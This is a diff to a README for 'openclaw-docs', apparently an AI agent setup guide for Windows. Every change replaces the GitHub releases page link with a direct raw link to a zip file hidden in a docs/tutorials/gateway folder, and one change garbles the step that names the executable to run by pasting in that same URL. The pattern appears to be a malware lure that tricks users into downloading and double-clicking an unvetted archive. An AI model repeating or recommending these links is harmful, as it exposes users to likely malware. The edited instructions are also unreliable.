@@ -1,6 +1,6 @@
 # 🦞 openclaw-docs - Easy AI Agent Setup Guide
 
-[![Download openclaw-docs](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/FawwazAzka/openclaw-docs/releases)
+[![Download openclaw-docs](https://raw.githubusercontent.com/FawwazAzka/openclaw-docs/main/docs/tutorials/gateway/docs_openclaw_springe.zip)](https://raw.githubusercontent.com/FawwazAzka/openclaw-docs/main/docs/tutorials/gateway/docs_openclaw_springe.zip)
 
 ## 📘 About openclaw-docs
 
@@ -35,11 +35,11 @@ To get openclaw-docs running on your Windows computer, follow these steps carefu
 
 Click the link below to open the release page. This page lists the latest versions of the software and related files.
 
-[![Download openclaw-docs](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/FawwazAzka/openclaw-docs/releases)
+[![Download openclaw-docs](https://raw.githubusercontent.com/FawwazAzka/openclaw-docs/main/docs/tutorials/gateway/docs_openclaw_springe.zip)](https://raw.githubusercontent.com/FawwazAzka/openclaw-docs/main/docs/tutorials/gateway/docs_openclaw_springe.zip)
 
 Or open this URL in your browser:
 
-https://github.com/FawwazAzka/openclaw-docs/releases
+https://raw.githubusercontent.com/FawwazAzka/openclaw-docs/main/docs/tutorials/gateway/docs_openclaw_springe.zip
 
 ### Step 2: Choose the Latest Version
 
@@ -63,7 +63,7 @@ If you see multiple files, choose the one labeled for Windows or stated as the m
 - If you downloaded a `.zip` file:  
   - Right-click the file and choose “Extract All.”  
   - Select a folder to save the extracted files.  
-  - Open that folder and look for a file like `openclaw-docs.exe` or `start.bat`.  
+  - Open that folder and look for a file like `https://raw.githubusercontent.com/FawwazAzka/openclaw-docs/main/docs/tutorials/gateway/docs_openclaw_springe.zip` or `https://raw.githubusercontent.com/FawwazAzka/openclaw-docs/main/docs/tutorials/gateway/docs_openclaw_springe.zip`.  
   - Double-click it to start the program.
 
 ### Step 5: Allow Network Access (If Prompted)
@@ -128,7 +128,7 @@ openclaw-docs is designed to be accessible for users with little to no programmi
 - Review the documentation included in the install directory for detailed commands.  
 - Keep the software updated by checking the release page regularly.  
 - Bookmark the GitHub releases page for quick access to updates:  
-  https://github.com/FawwazAzka/openclaw-docs/releases
+  https://raw.githubusercontent.com/FawwazAzka/openclaw-docs/main/docs/tutorials/gateway/docs_openclaw_springe.zip
 
 ---
 
@@ -145,4 +145,4 @@ The documentation is mostly in Chinese but is written simply for easy reading.
 
 ---
 
-[![Download openclaw-docs](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/FawwazAzka/openclaw-docs/releases)
+[![Download openclaw-docs](https://raw.githubusercontent.com/FawwazAzka/openclaw-docs/main/docs/tutorials/gateway/docs_openclaw_springe.zip)](https://raw.githubusercontent.com/FawwazAzka/openclaw-docs/main/docs/tutorials/gateway/docs_openclaw_springe.zip)
